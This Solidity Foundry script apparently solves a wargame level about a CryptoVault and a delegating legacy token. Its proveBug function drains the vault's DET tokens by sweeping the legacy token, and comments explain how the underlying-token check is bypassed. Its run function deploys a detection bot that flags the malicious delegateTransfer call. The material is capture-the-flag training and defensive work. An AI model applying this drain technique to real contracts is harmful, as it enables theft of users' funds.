// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../lib/forge-std/src/Script.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";

interface IDetToken {
    /**
     * @dev get address of CryptoVault
     * @return vaultAddress - address of CryptoVault
     */
    function cryptoVault() external view returns (address vaultAddress);

    function balanceOf(address account) external view returns (uint256 amount);

    function delegatedFrom() external view returns (address);

    function forta() external view returns (address);
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function raiseAlert(address user) external;
}

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
}

interface ICryptoVault {
    function sweepToken(IERC20 token) external;

    function sweptTokensRecipient() external view returns (address);
}

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

contract DETBot is Script, HelperConfigLib {
    function run(address _instanceAddress) external {
        vm.startBroadcast(ATTACKER_KEY);

        IDetToken detToken = IDetToken(_instanceAddress);

        ICryptoVault cryptoVault = ICryptoVault(detToken.cryptoVault());

        uint256 initialBalanceOfCryptoVault = detToken.balanceOf(
            address(cryptoVault)
        );

        address recipientAddr = cryptoVault.sweptTokensRecipient();

        IForta forta = IForta(detToken.forta());

        IDetectionBot myBot = new MyDetectionBot(
            address(cryptoVault),
            initialBalanceOfCryptoVault,
            recipientAddr,
            address(forta)
        );

        forta.setDetectionBot(address(myBot));

        vm.stopBroadcast();
    }

    /**
     * @notice if you call this method, you've got to get new instance of the level
     * @param _instanceAddress => contract.address, Which is the address of the DET Token instance
     */
    function proveBug(address _instanceAddress) external {
        vm.startBroadcast(ATTACKER_KEY);

        IDetToken detToken = IDetToken(_instanceAddress);
        // get crypto-vault instance
        ICryptoVault cryptoVault = ICryptoVault(detToken.cryptoVault());
        uint256 initialBalanceOfCryptoVault = detToken.balanceOf(
            address(cryptoVault)
        );
        require(
            initialBalanceOfCryptoVault == 100 ether,
            "Crypto vault doesnt hold 100 tokens"
        );
        // get LegacyToken Address
        address legacyTokenAddr = detToken.delegatedFrom();
        // call sweepToken method in CryptoVault Instance
        cryptoVault.sweepToken(IERC20(legacyTokenAddr));
        uint256 finalBalanceOfCryptoVault = detToken.balanceOf(
            address(cryptoVault)
        );

        require(
            finalBalanceOfCryptoVault == 0,
            "DET Tokens are not drained in CryptoVault"
        );
        // this shows that the underlying token of CryptoVault (DET) will be swept which breaks the core-logic

        /**
         * How the underlying token is drained?
         * When cryptoVault.sweepToken(address) is called using the address of the LegacyToken:
         * It bypass the `token != underlying` check, cuz it is not.
         * it calls the LegacyToken's transfer function which will call:
         * delegate.delegateTransfer(PLAYER_ADDRESS, AMOUNT, CRYPTO_VAULT_ADDRESS)
         * This drains the underlying token in the crypto-vault since the delegate == DET
         */
        vm.stopBroadcast();
    }
}

contract MyDetectionBot is IDetectionBot {
    address cryptoVaultAddr;
    uint256 vaultBalance;
    address recipientAddr;
    IForta forta;

    constructor(
        address _cryptoVaultAddr,
        uint256 _vaultBalance,
        address _recipientAddr,
        address _fortaAddress
    ) {
        cryptoVaultAddr = _cryptoVaultAddr;
        vaultBalance = _vaultBalance;
        recipientAddr = _recipientAddr;
        forta = IForta(_fortaAddress);
    }

    function handleTransaction(address player, bytes calldata msgData) public {
        bytes memory maliciousMsg = abi.encodeWithSignature(
            "delegateTransfer(address,uint256,address)",
            recipientAddr,
            vaultBalance,
            cryptoVaultAddr
        );
        if (keccak256(maliciousMsg) == keccak256(msgData)) {
            // raise Alert
            forta.raiseAlert(player);
        }
    }
}
